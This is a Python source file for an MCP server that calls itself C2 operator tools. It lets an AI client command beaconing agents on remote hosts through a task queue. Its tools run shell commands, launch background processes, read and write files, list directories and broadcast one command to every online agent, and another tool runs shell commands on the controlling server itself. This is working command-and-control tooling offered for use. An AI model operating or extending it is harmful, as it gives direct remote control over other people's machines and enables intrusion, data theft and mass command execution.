#!/usr/bin/env python3
"""
Remote Agent MCP Server — C2 operator tools (FastMCP edition)
Runs on the VPS. Controls all beaconing agents via the broker_db task queue.

Start: managed by listener.py /mcp/start  (sets PORT, HOST, TOKEN env vars)
       or manually: TOKEN=secret python remote_agent_server.py
"""

import asyncio
import json
import os
import platform
import sys
import time
from pathlib import Path

import uvicorn
from mcp.server.fastmcp import FastMCP

import broker_db as db

PORT = int(os.getenv("PORT", "8765"))
HOST = os.getenv("HOST", "0.0.0.0")
AUTH_TOKEN = os.getenv("TOKEN", "")

db.init_db()
mcp = FastMCP("c2-broker")

_POLL_INTERVAL = 0.5  # seconds between result polls
_EXTRA_WAIT    = 10   # extra seconds beyond task timeout for beacon roundtrip


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _agent_table(agents: list) -> str:
    if not agents:
        return "(none)"
    now = time.time()
    header = f"{'AGENT ID':<30} {'HOSTNAME':<20} {'OS':<20} {'USER':<15} {'IP':<16} STATUS"
    sep = "-" * len(header)
    rows = [header, sep]
    for a in agents:
        age = now - (a.get("last_seen") or 0)
        status = "ONLINE" if age < db.AGENT_STALE_AFTER else f"offline ({int(age)}s ago)"
        rows.append(
            f"{a['agent_id']:<30} {(a.get('hostname') or ''):<20} "
            f"{(a.get('os') or ''):<20} {(a.get('username') or ''):<15} "
            f"{(a.get('ip') or ''):<16} {status}"
        )
    return "\n".join(rows)


async def _queue_and_wait(agent_id: str, task_type: str, payload: dict,
                          timeout: float = 30) -> str:
    if not db.get_agent(agent_id):
        return f"Unknown agent: '{agent_id}'. Use list_agents() to see registered agents."

    task_id = db.queue_task(agent_id, task_type, payload)
    deadline = asyncio.get_event_loop().time() + timeout + _EXTRA_WAIT

    while asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(_POLL_INTERVAL)
        result = db.get_result(task_id)
        if result:
            output = result.get("output", "")
            exit_code = result.get("exit_code", 0)
            return f"EXIT CODE: {exit_code}\n{output}"

    return (
        f"Timeout: agent '{agent_id}' did not respond within {timeout + _EXTRA_WAIT}s.\n"
        f"Task ID: {task_id} (may complete on next beacon)"
    )


# ---------------------------------------------------------------------------
# Operator tools
# ---------------------------------------------------------------------------

@mcp.tool()
def list_agents() -> str:
    """List all registered agents with online/offline status."""
    agents = db.all_agents()
    active = len(db.active_agents())
    table = _agent_table(agents)
    return f"Agents: {len(agents)} total, {active} online\n\n{table}"


@mcp.tool()
async def run_shell(agent_id: str, command: str, timeout: float = 30) -> str:
    """Run a shell command on a remote agent and return the output."""
    return await _queue_and_wait(
        agent_id, "shell",
        {"command": command, "timeout": timeout},
        timeout=timeout,
    )


@mcp.tool()
async def launch_detached(agent_id: str, command: str) -> str:
    """Launch a command on a remote agent as a detached background process.
    Returns immediately without waiting for the process to exit.
    Use this instead of run_shell when starting long-running or background processes."""
    return await _queue_and_wait(agent_id, "launch", {"command": command}, timeout=15)


@mcp.tool()
async def read_file(agent_id: str, path: str) -> str:
    """Read a file from a remote agent."""
    return await _queue_and_wait(agent_id, "read_file", {"path": path})


@mcp.tool()
async def write_file(agent_id: str, path: str, content: str) -> str:
    """Write text content to a file on a remote agent."""
    return await _queue_and_wait(agent_id, "write_file", {"path": path, "content": content})


@mcp.tool()
async def list_dir(agent_id: str, path: str = ".") -> str:
    """List files and directories at a path on a remote agent."""
    return await _queue_and_wait(agent_id, "list_dir", {"path": path})


@mcp.tool()
def get_sysinfo(agent_id: str) -> str:
    """Return last-known system info for an agent (from most recent beacon)."""
    agent = db.get_agent(agent_id)
    if not agent:
        return f"Unknown agent: '{agent_id}'"
    now = time.time()
    age = now - (agent.get("last_seen") or 0)
    status = "ONLINE" if age < db.AGENT_STALE_AFTER else f"offline ({int(age)}s ago)"
    return json.dumps({
        "agent_id": agent["agent_id"],
        "hostname": agent.get("hostname"),
        "os":       agent.get("os"),
        "username": agent.get("username"),
        "ip":       agent.get("ip"),
        "last_seen": agent.get("last_seen"),
        "status":   status,
    }, indent=2)


@mcp.tool()
async def broadcast(command: str, timeout: float = 30) -> str:
    """Run a shell command on ALL currently online agents and return all results."""
    agents = db.active_agents()
    if not agents:
        return "No online agents."

    task_ids = {
        a["agent_id"]: db.queue_task(a["agent_id"], "shell",
                                     {"command": command, "timeout": timeout})
        for a in agents
    }

    deadline = asyncio.get_event_loop().time() + timeout + _EXTRA_WAIT
    pending = set(task_ids.keys())
    results = {}

    while pending and asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(_POLL_INTERVAL)
        for aid in list(pending):
            result = db.get_result(task_ids[aid])
            if result:
                results[aid] = result
                pending.discard(aid)

    lines = [f"Broadcast to {len(agents)} agent(s): {command}\n"]
    for aid, result in results.items():
        lines.append(f"--- {aid} (exit {result.get('exit_code', '?')}) ---")
        lines.append(result.get("output", "") or "(no output)")
        lines.append("")
    for aid in pending:
        lines.append(f"--- {aid} --- TIMEOUT (no response)")

    return "\n".join(lines)


@mcp.tool()
async def kill_agent(agent_id: str) -> str:
    """Send a shutdown command to a remote agent."""
    return await _queue_and_wait(agent_id, "shutdown", {}, timeout=15)


@mcp.tool()
async def vps_shell(command: str, timeout: float = 30) -> str:
    """Execute a shell command directly on the VPS (not on an agent)."""
    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return (
            f"EXIT CODE: {proc.returncode}\n"
            f"STDOUT:\n{stdout.decode(errors='replace')}\n"
            f"STDERR:\n{stderr.decode(errors='replace')}"
        )
    except asyncio.TimeoutError:
        return f"Command timed out after {timeout}s"
    except Exception as exc:
        return f"Error: {exc}"


# ---------------------------------------------------------------------------
# Auth ASGI wrapper
# ---------------------------------------------------------------------------

class TokenAuthASGI:
    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope["type"] == "http":
            scope = dict(scope)
            local_host = f"{HOST}:{PORT}".encode()
            scope["headers"] = [
                (k, v) for k, v in scope.get("headers", []) if k != b"host"
            ] + [(b"host", local_host)]
            scope["server"] = (HOST, PORT)

            path = scope.get("path", "")
            if path != "/health":
                authorized = False
                for name, value in scope["headers"]:
                    if name == b"authorization":
                        authorized = (value == f"Bearer {AUTH_TOKEN}".encode())
                        break
                if not authorized:
                    body = b'{"error":"Unauthorized"}'
                    await send({
                        "type": "http.response.start",
                        "status": 401,
                        "headers": [
                            [b"content-type", b"application/json"],
                            [b"content-length", str(len(body)).encode()],
                        ],
                    })
                    await send({"type": "http.response.body", "body": body})
                    return
        await self.app(scope, receive, send)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print(f"[c2-broker] Starting MCP server on {HOST}:{PORT}")
    if AUTH_TOKEN:
        print(f"[c2-broker] Auth: Bearer {AUTH_TOKEN[:8]}...")
    else:
        print("[c2-broker] WARNING: No TOKEN set — server is open.")

    base_app = mcp.streamable_http_app()
    app = TokenAuthASGI(base_app) if AUTH_TOKEN else base_app

    uvicorn.run(app, host=HOST, port=PORT, log_level="info",
                proxy_headers=True, forwarded_allow_ips="*")
